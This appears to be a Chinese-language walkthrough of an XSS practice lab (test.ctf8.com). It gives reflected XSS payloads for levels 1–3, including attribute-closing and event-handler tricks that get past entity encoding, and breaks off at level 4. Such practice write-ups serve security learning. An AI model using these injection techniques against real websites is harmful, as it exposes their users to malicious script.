# XSS练习平台 test.ctf8.com

## level 1

![image-20250828150129552](images/image-20250828150129552.png)

直接加

```
<script>alert(1)</script>
```

![image-20250828150231459](images/image-20250828150231459.png)



## level 2

![image-20250828150345232](images/image-20250828150345232.png)

keyword的值会放在value里面，闭合value

```
"><script>alert(1)</script>
```



## level 3

- `"` 被编码为  & quot
- `/` 保持原样（部分系统可能不编码此字符）
- `>` 被编码为 & gt
- `<` 被编码为 & lt

​       导致<>  无法闭合

![image-20250828152743773](images/image-20250828152743773.png)

不能用 <,>,"  另辟蹊径，用'闭合value，事件用onclick，并闭合value ,注释后面的 ">

```
' onclick=alert(1)//
' onfocus=alert(1)//
```

![image-20250828160048431](images/image-20250828160048431.png)



## level4

过滤了<> ，双引号，单引号

![image-20250828160336318](images/image-20250828160336318.png)